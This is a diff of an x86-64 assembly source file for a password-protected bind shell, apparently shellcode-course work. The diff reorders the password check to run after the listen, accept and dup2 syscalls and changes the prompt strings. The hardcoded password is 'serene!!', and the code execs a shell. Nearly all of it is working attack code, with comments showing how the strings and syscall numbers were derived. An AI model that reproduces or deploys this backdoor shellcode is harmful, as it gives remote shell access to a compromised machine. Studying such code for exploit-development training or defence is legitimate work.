@@ -1,17 +1,11 @@
 global _start  
 section .text  
-  
-	
+
 _start:  
-
-	jmp password
+	jmp socket
 	hello_world: db 'Enter your password to run your bindshell',0xA
-	password_correct: db 'System is listening on port 4444 .......',0xA
 	password_wrong: db 'Incorrect Password',0xA
-
-
-;kali@kali:~/Desktop$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep "write"
-;#define __NR_write 1
+	password_correct: db 'You have spawn a shell !',0xA
 
 password_incorrect:
 
@@ -29,99 +23,12 @@ password_incorrect:
 ;>>> len(cmd)
 ;18            
 
-        mov dl, 19	                   ; size of hello_world
-        syscall			; will prompt the strings 'Password Incorrect'
+        mov dl, 19                         ; size of hello_world
+        syscall                 ; will prompt the strings 'Password Incorrect'
+	jmp password
 
 
-
-password:
-
-        ; sys_write
-        ; rax : 1
-        ; rdi : unsigned int fd : 1 for stdout
-        ; rsi : const char *buf : string
-        ; rdx : size_t count : how big is the string 
-
-        xor rax, rax                  ; zero out rax
-        mov rdx, rax                  ; zero out rdx
-        inc rax                       ; write syscall
-        mov rdi, rax                  ; move 1 into rdi
-        lea rsi, [rel hello_world] ; moving the address of hello_world variable into rsi which is second parameter
-
-;kali@kali:~/Desktop$ python
-;Python 2.7.17 (default, Oct 19 2019, 23:36:22) 
-;[GCC 9.2.1 20191008] on linux2
-;Type "help", "copyright", "credits" or "license" for more information.
-;>>> cmd ='Enter your password to run your bindshell'
-;>>> len(cmd)
-;41                                                                                        
-;>>>               
-
-        mov dl, 42                   ; size of hello_world
-
-        syscall			; will prompt the strings 'Enter your password to run your bindshell'
-
-        ; sys_read
-        ; rdi : unsigned int fd : 0 for stdin
-        ; rsi : char *buf : stack?
-        ; rdx : size_t count : how big
-
-        xor rax, rax ; zero out value of rax
-        mov rdi, rax ; zero out value of rdi
-        mov rdx, rax ; zero out value of rdx
-
-        ; leave rax since read syscall is 0
-        mov rsi, rsp    ; set buffer to stack
-        add rdx, 8    ; setting size of Password
-
-        syscall ; calling read
-
-
-;kali@kali:~/Desktop$ python
-;Python 2.7.17 (default, Oct 19 2019, 23:36:22) 
-;[GCC 9.2.1 20191008] on linux2
-;Type "help", "copyright", "credits" or "license" for more information.
-;>>> cmd='serene!!'
-;>>> cmd
-;'serene!!'
-;>>> cmd[::-1]
-;'!!eneres'
-;>>> cmd[::-1].encode('hex')
-;'2121656e65726573'
-;>>> 2121656e65726573
-
-
-        mov rdi, rsp                ; setting rdi to input buffer
-        mov rax, 0x2121656e65726573 ; moving Password into buffer
-        scasd                       ; scanning for a match
-        jne password_incorrect           ; if not a match then re-ask for password
-
-
-
-
-
-;		PROMPT PASSWORD CORRECT
-
-
-        xor rax, rax                  ; zero out rax
-        mov rdx, rax                  ; zero out rdx
-        inc rax                       ; write syscall
-        mov rdi, rax                  ; move 1 into rdi
-        lea rsi, [rel password_correct] ; moving the address of hello_world variable into rsi which is second parameter
-
-;kali@kali:~/Desktop$ python
-;Python 2.7.17 (default, Oct 19 2019, 23:36:22) 
-;[GCC 9.2.1 20191008] on linux2
-;Type "help", "copyright", "credits" or "license" for more information.
-;>>> cmd='System is listening on port 4444 .......'
-;>>> len(cmd)
-;40        
-
-        mov dl, 41	                   ; size of Password_correct
-        syscall			; will prompt the strings 'System is listening on port 4444 .......'
-
-
-
+socket:
 
 ;    // Create socket  
 ;    host_sockid = socket(PF_INET, SOCK_STREAM, 0);  
@@ -187,8 +94,9 @@ password:
 	mov al,50
 	; rdi have the value of host_sockid
 	xor rsi,rsi
-	add sil,0x2
+	inc rsi
 	syscall
+
 
 ;    client_sockid = accept(host_sockid, NULL, NULL);
 ;kali@kali:~/Desktop$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep "accept"
@@ -213,39 +121,103 @@ password:
 	mov r15,rdi
 	xor rax,rax
 	mov al,33
-	
 	xor rsi,rsi
 	syscall
 
 	xor rax,rax
 	mov al,33
-	add sil,1
+	inc rsi
 	syscall
 
 	xor rax,rax
 	mov al,33
-	add sil,1
+	inc rsi
 	syscall
 
 
+;kali@kali:~/Desktop$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep "dup2"
+;#define __NR_dup2 33
 
-;	execve("/bin/sh", NULL, NULL);
+password:
+        ; sys_write
+        ; rax : 1
+        ; rdi : unsigned int fd : 1 for stdout
+        ; rsi : const char *buf : string
+        ; rdx : size_t count : how big is the string 
+
+        xor rax, rax                  ; zero out rax
+        mov rdx, rax                  ; zero out rdx
+        inc rax                       ; write syscall
+        mov rdi, rax                  ; move 1 into rdi
+        lea rsi, [rel hello_world] ; moving the address of hello_world variable into rsi which is second parameter
 
 ;kali@kali:~/Desktop$ python
 ;Python 2.7.17 (default, Oct 19 2019, 23:36:22) 
 ;[GCC 9.2.1 20191008] on linux2
 ;Type "help", "copyright", "credits" or "license" for more information.
-;>>> cmd='/bin//sh'
-;>>> cmd
-;'/bin//sh'
+;>>> cmd ='Enter your password to run your bindshell'
 ;>>> len(cmd)
-;8
+;41                                                                                        
+;>>>               
+
+        mov dl, 42                   ; size of hello_world
+
+        syscall                 ; will prompt the strings 'Enter your password to run your bindshell'
+
+        ; sys_read
+        ; rdi : unsigned int fd : 0 for stdin
+        ; rsi : char *buf : stack?
+        ; rdx : size_t count : how big
+
+        xor rax, rax ; zero out value of rax
+        mov rdi, rax ; zero out value of rdi
+        mov rdx, rax ; zero out value of rdx
+
+        ; leave rax since read syscall is 0
+        mov rsi, rsp    ; set buffer to stack
+        add rdx, 8    ; setting size of Password
+
+        syscall ; calling read
+
+
+;kali@kali:~/Desktop$ python
+;Python 2.7.17 (default, Oct 19 2019, 23:36:22) 
+;[GCC 9.2.1 20191008] on linux2
+;Type "help", "copyright", "credits" or "license" for more information.
+;>>> cmd='serene!!'
+;>>> cmd
+;'serene!!'
 ;>>> cmd[::-1]
-;'hs//nib/'
+;'!!eneres'
 ;>>> cmd[::-1].encode('hex')
-;'68732f2f6e69622f'
-;kali@kali:~/Desktop$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep "execve"
-;#define __NR_execve 59
+;'2121656e65726573'
+;>>> 2121656e65726573
+
+
+        mov rdi, rsp                ; setting rdi to input buffer
+        mov rax, 0x2121656e65726573 ; moving Password into buffer
+        scasd                       ; scanning for a match
+        jne password_incorrect           ; if not a match then re-ask for password
+
+;               PROMPT PASSWORD CORRECT
+
+        xor rax, rax                  ; zero out rax
+        mov rdx, rax                  ; zero out rdx
+        inc rax                       ; write syscall
+        mov rdi, rax                  ; move 1 into rdi
+        lea rsi, [rel password_correct] ; moving the address of hello_world variable into rsi which is second parameter
+
+;kali@kali:~/Desktop$ python
+;Python 2.7.17 (default, Oct 19 2019, 23:36:22) 
+;[GCC 9.2.1 20191008] on linux2
+;Type "help", "copyright", "credits" or "license" for more information.
+;>>> cmd ='You have spawn a shell !'
+;>>> len(cmd)
+;24
+
+        mov dl, 25                         ; size of Password_correct
+        syscall                 ; will prompt the strings 'System is listening on port 4444 .......'
+
 
 	xor rax,rax
 	mov al,59
